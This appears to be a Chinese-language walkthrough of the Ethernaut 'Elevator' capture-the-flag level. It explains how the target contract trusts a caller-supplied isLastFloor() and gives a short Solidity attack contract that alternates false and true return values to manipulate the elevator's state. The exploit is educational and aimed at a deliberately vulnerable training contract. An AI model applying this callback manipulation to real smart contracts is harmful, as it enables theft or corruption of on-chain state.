# Elevator

## Reference
[Elevator](https://ethernaut.openzeppelin.com/level/11)

[Elevator.sol](https://github.com/yuhuajing/ethernaut-book/blob/main/src/11-Elevator/Elevator.sol)

## 目标
1. 构建一个`Building`合约，实现电梯永远不会到顶

## 分析
### goto()
```solidity
    function goTo(uint256 _floor) public {
        Building building = Building(msg.sender);

        if (!building.isLastFloor(_floor)) {
            floor = _floor;
            top = building.isLastFloor(floor);
        }
    }
```
1. goto()函数实现电梯上下行
2. `!building.isLastFloor(_floor)`,通过判断电梯是否到顶
   1. 为了实现永不到顶，此处的判断应该返回false
   2. 进入 if 分支后：
      1. 电梯上/下行，修改 floor 的楼层数
      2. 通过 `building.isLastFloor(floor);`再次获取是否到达顶层
3. if条件和当前是否到顶是同此独立的外部 call 获取参数。按照分支判断，要求第一次查询参数返回false,第二次返回true。表明当前已经到顶，但是下次仍然可以上/下行

| 次数    | 结果    |
|-------|-------|
| One   | false |
| Two   | true  |
| Three | false |
| ...   | ...   |
| 奇数次   | false |
| 偶数次   | true  |
4. 通过bool flag全局变量实现次数的控制
```solidity
        if (!flag) {
            flag = true;
            return false;
        } else {
            flag = false;
            return true;
        }
```
## 攻击合约
```solidity
    function attack(uint256 _floor) external {
        elevator.goTo(_floor);
    }

    function isLastFloor(uint256) public returns (bool) {
        if (!flag) {
            flag = true;
            return false;
        } else {
            flag = false;
            return true;
        }
    }
```
## attack()
1. `attack()`函数底层`call Elevator`合约
2. 在`Elevator`合约中，反调攻击合约的 `isLastFloor()` 函数，判断楼层和到顶情况

## 实现步骤
1. 部署攻击合约 `AttackBuilding`，部署目标合约 `Elevator`
2. 调用攻击合约 `AttackBuilding` 的 `attack()` 函数，实现电梯任意上/下行楼层，并且当次到顶
